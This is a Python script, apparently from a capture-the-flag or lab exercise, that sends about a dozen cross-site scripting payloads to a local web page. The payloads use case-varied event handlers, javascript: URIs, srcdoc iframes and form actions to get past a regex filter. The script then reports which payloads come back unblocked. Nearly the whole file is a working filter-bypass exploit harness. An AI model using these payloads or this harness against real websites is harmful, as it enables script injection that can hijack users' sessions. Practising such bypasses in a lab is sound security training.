import requests
import re

url = "http://127.0.0.1:33031/page"
param = "solution"

print("=" * 70)
print("STEP 7: Finding the exact working bypass")
print("=" * 70)

# The key finding: uppercase and mixed case don't match the on\w+ regex
# Let's try variations that might actually work

test_cases = [
    # Case variations
    ("UPPERCASE ONERROR", '<img src=x ONERROR=alert("XSS")>'),
    ("Mixed case OnError", '<img src=x OnError=alert("XSS")>'),
    ("Mixed case onError", '<img src=x onError=alert("XSS")>'),
    ("Mixed case oNeRrOr", '<img src=x oNeRrOr=alert("XSS")>'),
    
    # Tag variations  
    ("SVG onload uppercase", '<svg ONLOAD=alert("XSS")>'),
    ("BODY onload uppercase", '<BODY ONLOAD=alert("XSS")>'),
    ("INPUT onfocus uppercase", '<INPUT ONFOCUS=alert("XSS") AUTOFOCUS>'),
    
    # Different event handlers
    ("onerror uppercase", '<img src=x ONERROR=alert("XSS")>'),
    ("onclick uppercase", '<input TYPE=button ONCLICK=alert("XSS")>'),
    ("onmouseover uppercase", '<b ONMOUSEOVER=alert("XSS")>hover me</b>'),
    
    # With other attributes
    ("srcdoc", '<iframe SRCDOC="<script>alert(\'XSS\')</script>"></iframe>'),
    
    # Action/XForm
    ("form action", '<form ACTION="javascript:alert(\'XSS\')"><input type=submit></form>'),
    ("input formaction", '<input TYPE=submit FORMACTION="javascript:alert(\'XSS\')">'),
    
    # Using other protocols
    ("iframe src", '<iframe SRC="javascript:alert(\'XSS\')"></iframe>'),
]

successful_bypasses = []

for name, payload in test_cases:
    data = {param: payload}
    resp = requests.post(url, data=data, timeout=10)
    
    match = re.search(r'<div class="solution-text">(.*?)</div>', resp.text, re.DOTALL)
    if match:
        reflected = match.group(1).strip()
        blocked = "error_star" in resp.text
        success = "new_star" in resp.text
        
        print(f"\n{name}: {payload[:50]}...")
        print(f"  -> Blocked: {blocked}, Not Blocked: {success}")
        
        # Check what actually got reflected
        if payload in resp.text:
            print(f"  -> Payload reflected unchanged!")
            successful_bypasses.append((name, payload))
        elif "XSS" in resp.text or "alert" in resp.text.lower():
            print(f"  -> Something from payload reflected")
            # Check what was reflected
            print(f"  -> Reflection: {reflected[:150]}...")

print("\n" + "=" * 70)
print("SUCCESSFUL BYPASSES (payloads that weren't blocked):")
print("=" * 70)
for name, payload in successful_bypasses:
    print(f"\n{name}:")
    print(f"  Payload: {payload}")

